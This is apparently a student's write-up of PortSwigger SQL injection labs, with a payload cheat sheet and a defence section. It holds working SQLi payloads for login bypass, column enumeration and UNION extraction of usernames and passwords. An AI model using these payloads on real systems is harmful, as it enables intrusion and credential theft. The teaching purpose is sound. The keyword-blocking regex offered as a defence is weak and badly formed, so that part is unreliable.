
#Report — SQL Injection (PortSwigger Web Security Academy)

Author: Gerard Lonzi
Platform: PortSwigger Web Security Academy
Date: June 2026
Status: In Progress 🚀

#📋 Table of Contents
Introduction to SQL Injection

Lab 1 — SQL Injection in the WHERE clause

Lab 2 — Authentication Bypass

Lab 3 — UNION Attack: Determining the Number of Columns

Lab 4 — UNION Attack: Finding Visible Columns

Lab 5 — UNION Attack: Extracting Data

System Info via SQL Injection

Payload Cheat Sheet

How to Protect Yourself

Resources


#1. Introduction to SQL Injection
Definition
SQL Injection (SQLi) is an attack that consists of injecting malicious SQL code into a web application's input field to manipulate the queries sent to the database.

Why does it work?
PHP

// Vulnerable Code — user input is concatenated directly
$query = "SELECT * FROM users WHERE username = '" . $input . "'";

// If the user inputs: admin'--
// The query becomes:
// SELECT * FROM users WHERE username = 'admin'--'
// Everything after -- is a comment → the password is completely ignored!
Types of SQL Injection
Type	Description
In-band SQLi	Results are displayed directly on the webpage.
Blind SQLi	No visible results; data is inferred via true/false responses.
Error-based	Exploits database error messages to leak info.
UNION-based	Combines queries to extract data.
Time-based	Measures database response time to infer information.

Export to Sheets

#2. Lab 1 — SQL Injection in the WHERE clause
Objective
Manipulate the SQL query of a category filter to display hidden products.

Context
URL: [https://site.com/products?category=Gifts](https://site.com/products?category=Gifts)

Backend Query:

SQL

SELECT name, description, price 
FROM products 
WHERE category = 'Gifts' AND visible = 1
Exploitation
Injected Payload: Gifts' OR 1=1--

Generated Query:

SQL

SELECT name, description, price 
FROM products 
WHERE category = 'Gifts' OR 1=1--' AND visible = 1
Explanation:

OR 1=1 → Always true → Returns ALL products.

-- → Comments out the rest of the query → The AND visible=1 condition is ignored.

Result: All products are displayed, including hidden ones ✅

3. Lab 2 — Authentication Bypass
Objective
Log in as the administrator without knowing the password.

Context
A login form with two fields: username and password.

Backend Query:

SQL

SELECT * FROM users 
WHERE username = 'INPUT' AND password = 'INPUT'
Exploitation
In the username field: administrator'--

In the password field: anything

Generated Query:

SQL

SELECT * FROM users 
WHERE username = 'administrator'--' AND password = 'anything'
Explanation:

' → Closes the username string quote.

-- → Comments out everything that follows → AND password = '...' is completely ignored!

Result: You log in without a password.

Other Bypass Payloads:

SQL

' OR 1=1--
' OR '1'='1
admin'--
' OR 1=1#          (MySQL)
Result: Successful login as administrator ✅

#4. Lab 3 — UNION Attack: Determining the Number of Columns
Objective
Find how many columns the original query returns — a mandatory step before executing a UNION attack.

Why is this necessary?
SQL

-- The original query has 3 columns
SELECT name, description, price FROM products WHERE category = 'Gifts'

-- The UNION query must have the EXACT same number of columns
UNION SELECT col1, col2, col3 FROM other_table   ✅

-- Otherwise → ERROR
UNION SELECT col1, col2 FROM other_table          ❌
Method 1 — ORDER BY
Increment the column index until you trigger an error:

Gifts' ORDER BY 1-- → ✅ No error

Gifts' ORDER BY 2-- → ✅ No error

Gifts' ORDER BY 3-- → ✅ No error

Gifts' ORDER BY 4-- → ❌ ERROR → The table has 3 columns!

Generated Query for ORDER BY 4:

SQL

SELECT name, description, price FROM products 
WHERE category = 'Gifts' ORDER BY 4--'
-- Error: "ORDER BY position 4 is out of range"
Method 2 — UNION SELECT NULL
Add NULL values one by one until the query succeeds:

Gifts' UNION SELECT NULL-- → ❌ Error (1 ≠ 3)

Gifts' UNION SELECT NULL,NULL-- → ❌ Error (2 ≠ 3)

Gifts' UNION SELECT NULL,NULL,NULL-- → ✅ Success! (3 = 3)

Why use NULL?

NULL is compatible with ALL data types (text, numbers, dates). Injecting a random string like 'abc' into an integer column would trigger a data type error.

Result: 3 columns identified ✅

#5. Lab 4 — UNION Attack: Finding Visible Columns
Objective
Identify which columns are actually rendered on the webpage.

The Problem
The table might return 3 columns, but the backend application might only print 2:

PHP

// The developer only prints name and price
while ($row = $result->fetch()) {
    echo $row['name'];   // ✅ Displayed
    echo $row['price'];  // ✅ Displayed
    // description       // ❌ Hidden / Not printed
}
If you dump passwords into a hidden column, you will never see them!

Technique — Injecting 'test' Column by Column
Testing Column 1: Gifts' UNION SELECT 'test',NULL,NULL--

Plaintext

┌─────────────────────┐
│ T-shirt    $25      │
│ Mug        $12      │
│ test       NULL  ✅ │  ← 'test' appears → Column 1 is visible!
└─────────────────────┘
Testing Column 2: Gifts' UNION SELECT NULL,'test',NULL--

Plaintext

┌─────────────────────┐
│ T-shirt    $25      │
│ Mug        $12      │
│                     │  ← Nothing → Column 2 is hidden ❌
└─────────────────────┘
Testing Column 3: Gifts' UNION SELECT NULL,NULL,'test'--

Plaintext

┌─────────────────────┐
│ T-shirt    $25      │
│ Mug        $12      │
│ NULL       test  ✅ │  ← 'test' appears → Column 3 is visible!
└─────────────────────┘
Result
Column 1 (name) → ✅ Visible

Column 2 (description) → ❌ Hidden

Column 3 (price) → ✅ Visible

#6. Lab 5 — UNION Attack: Extracting Data
Objective
Extract usernames and passwords from the users table.

Exploitation
Place target data into the identified visible columns (1 and 3):

Plaintext

Gifts' UNION SELECT username,NULL,password FROM users--
Full Query:

SQL

SELECT name, description, price FROM products WHERE category = 'Gifts'
UNION
SELECT username, NULL, password FROM users--
Webpage Output:

Plaintext

┌───────────────────────────────────────┐
│ T-shirt          $25                  │
│ Mug              $12                  │
│ administrator    s3cr3tpassw0rd  ✅   │
│ alice            alice123        ✅   │
│ bob              bob456          ✅   │
└───────────────────────────────────────┘
Special Case — Only One Visible Column
If only a single column is visible, concatenate the data:

SQL

-- MySQL
' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--

-- PostgreSQL
' UNION SELECT username||':'||password,NULL,NULL FROM users--

-- Output:
-- administrator:s3cr3tpassw0rd
-- alice:alice123

#7. System Info via SQL Injection
Database Version
SQL

-- MySQL / MariaDB
' UNION SELECT @@version,NULL,NULL--

-- PostgreSQL
' UNION SELECT version(),NULL,NULL--

-- Oracle
' UNION SELECT banner,NULL,NULL FROM v$version--

-- SQLite
' UNION SELECT sqlite_version(),NULL,NULL--
Current Database Name
SQL

-- MySQL
' UNION SELECT database(),NULL,NULL--

-- PostgreSQL
' UNION SELECT current_database(),NULL,NULL--
Listing All Tables
SQL

' UNION SELECT table_name,NULL,NULL 
  FROM information_schema.tables
  WHERE table_schema=database()--

-- Possible output:
-- users
-- products
-- orders
-- admin_panel
Listing Columns of a Table
SQL

' UNION SELECT column_name,NULL,NULL 
  FROM information_schema.columns
  WHERE table_name='users'--

-- Output:
-- id
-- username
-- password
-- email
-- is_admin

#8. Payload Cheat Sheet
Detection
' → Basic vulnerability test

" → Double quote test

;-- → Query termination test

Authentication Bypass
SQL

' OR 1=1--
' OR '1'='1'--
admin'--
administrator'--
Column Counting
SQL

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--             → Error = N-1 columns

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
Finding Visible Columns
SQL

' UNION SELECT 'test',NULL,NULL--
' UNION SELECT NULL,'test',NULL--
' UNION SELECT NULL,NULL,'test'--
Data Extraction
SQL

' UNION SELECT username,NULL,password FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
DB-Specific Comments
-- → MySQL, PostgreSQL, MSSQL

# → MySQL only

/* → Universal

#9. How to Protect Yourself

✅ Prepared Statements (The True Solution)
Python

# ❌ VULNERABLE
query = f"SELECT * FROM users WHERE username = '{input}'"

# ✅ SECURE
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (input,))
PHP

// ❌ VULNERABLE
$query = "SELECT * FROM users WHERE username = '$input'";

// ✅ SECURE
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$input]);

✅ ORMs (Automatic Protection)
Python

# SQLAlchemy — secure by default
user = User.query.filter_by(username=input).first()

✅ Input Validation
Python

import re
# Block dangerous characters
if re.search(r"[';--]", input):
    raise ValueError("Forbidden characters detected")
    
✅ Principle of Least Privilege
SQL

-- The web application's DB user should only have read access
GRANT SELECT ON products TO webapp_user;
-- Never allow: DROP, DELETE, UPDATE, INSERT on sensitive tables

✅ WAF (Web Application Firewall)
Detects and blocks known SQLi payloads before they reach the application or database.

#10. Resources

images :
../images/sql-injection-screen2.png
../images/sql-injection-screen2.png

Resource	        Link	                   Description
PortSwigger Web Academy	portswigger.net	Official   courses + labs


🗺️ Complete Workflow — UNION Attack
Detect the vulnerability

└── Gifts' → SQL error? ✅

Count the columns

└── ORDER BY 1,2,3... → Error at N means there are N−1 columns.

Confirm with UNION NULL

└── UNION SELECT NULL,NULL,NULL → Success ✅

Find visible columns

└── Replace NULL with 'test' one by one.

Extract system info

└── 
Oracle	    SELECT banner FROM v$version
            SELECT version FROM v$instance
Microsoft	  SELECT @@version
PostgreSQL	SELECT version()
MySQL	      SELECT @@version

List the tables

└── FROM information_schema.tables

Oracle	   SELECT * FROM all_tables
           SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
Microsoft	 SELECT * FROM information_schema.tables
           SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
PostgreSQL SELECT * FROM information_schema.tables
           SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
MySQL	     SELECT * FROM information_schema.tables
           SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

List the columns

└── FROM information_schema.columns

Extract target data

└── SELECT username, password FROM users

⚠️ Disclaimer: This report is written for educational and training purposes in cybersecurity. All techniques presented were practiced in legal environments (PortSwigger Labs). Never use these techniques on production systems without explicit authorization.



Report generated as part of PortSwigger Web Security Academy training — 2026.
WRITTEN BY GERARD KIBZU 
